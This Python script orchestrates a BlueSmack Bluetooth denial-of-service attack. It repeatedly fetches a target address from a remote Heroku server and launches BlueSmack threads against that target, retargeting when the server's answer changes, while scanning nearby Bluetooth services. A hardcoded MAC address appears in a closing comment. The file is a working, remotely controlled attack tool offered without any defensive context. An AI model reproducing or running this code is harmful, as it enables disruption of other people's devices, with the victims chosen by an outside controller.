import os
import threading
import time
import sys
import BlueSmack
import scanBluetooth
import requests

def main(stopping_event, stop_scanning_event):
    web = 'https://bluesmacking.herokuapp.com/'
    curr_target = requests.get(f"{web}target").text
    
    curr_thread = threading.Thread(target=BlueSmack.main, args=(curr_target, stopping_event,))
    curr_thread.start()
    
    counter = 0
    while not stop_scanning_event.is_set():
        time.sleep(5)
        counter += 1
        print(f"check new target: {counter}")
        new_target = requests.get(f"{web}target").text
        if new_target != curr_target or not curr_thread.is_alive():
            print("attacking new taget")
            stopping_event.set()
            curr_thread.join()
            stopping_event.clear()
            curr_target = new_target
            curr_thread = threading.Thread(target=BlueSmack.main, args=(curr_target, stopping_event,))
            curr_thread.start()
    
    stopping_event.set()
    curr_thread.join()

def start(stopping_event, stop_scanning_event):
    main_thread = threading.Thread(target=main, args=(stopping_event, stop_scanning_event))
    
    try:
        main_thread.start()
        while not stop_scanning_event.is_set():
            scanBluetooth.scan_services()
            time.sleep(5)
    except KeyboardInterrupt:
        stop_scanning_event.set()    
        
    stopping_event.set()
    main_thread.join()
        
if __name__ == '__main__':
    stopping_event = threading.Event()
    stop_scanning_event = threading.Event()
    start_thread = threading.Thread(target=start, args=(stopping_event, stop_scanning_event,))

    try:
        start_thread.start()
        start_thread.join()
    except KeyboardInterrupt:
        stopping_event.set()
        stop_scanning_event.set()
        start_thread.join()
    


# 88:C6:26:F7:14:4B 